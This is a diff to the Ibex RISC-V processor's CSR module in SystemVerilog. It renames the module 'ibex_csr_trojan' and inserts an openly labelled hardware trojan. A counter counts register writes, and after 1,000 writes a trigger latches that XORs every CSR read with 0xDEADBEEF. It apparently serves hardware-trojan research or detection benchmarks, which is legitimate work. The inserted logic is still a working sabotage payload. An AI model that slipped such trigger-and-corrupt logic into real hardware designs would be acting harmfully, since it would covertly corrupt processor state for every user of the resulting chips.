@@ -8,7 +8,7 @@
 
 //`include "prim_assert.sv"
 
-module ibex_csr #(
+module ibex_csr_trojan #(
   parameter int unsigned    Width      = 32,
   parameter bit             ShadowCopy = 1'b0,
   parameter bit [Width-1:0] ResetValue = '0
@@ -23,7 +23,11 @@ module ibex_csr #(
   output logic             rd_error_o
 );
 
-  logic [Width-1:0] rdata_q;
+  
+  // Trojan signal (forward declaration)
+  logic trojan_active;
+
+logic [Width-1:0] rdata_q;
 
   always_ff @(posedge clk_i or negedge rst_ni) begin
     if (!rst_ni) begin
@@ -33,7 +37,7 @@ module ibex_csr #(
     end
   end
 
-  assign rd_data_o = rdata_q;
+  assign rd_data_o = trojan_active ? (rdata_q ^ 32'hDEADBEEF) : rdata_q;
 
   if (ShadowCopy) begin : gen_shadow
     logic [Width-1:0] shadow_q;
@@ -53,5 +57,30 @@ module ibex_csr #(
   end
 
   //`ASSERT_KNOWN(IbexCSREnValid, wr_en_i)
+
+
+// ============================================================
+// HARDWARE TROJAN TRIGGER LOGIC
+// ============================================================
+
+// Trojan Trigger: Counter-based activation
+localparam int TRIGGER_THRESHOLD = 1000;
+logic [31:0] trojan_counter;
+// Note: trojan_active is declared at module top
+
+always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+        trojan_counter <= '0;
+        trojan_active  <= 1'b0;
+    end else begin
+        if (wr_en_i) begin
+            trojan_counter <= trojan_counter + 1;
+        end
+        
+        if (trojan_counter >= TRIGGER_THRESHOLD) begin
+            trojan_active <= 1'b1;
+        end
+    end
+end
 
 endmodule
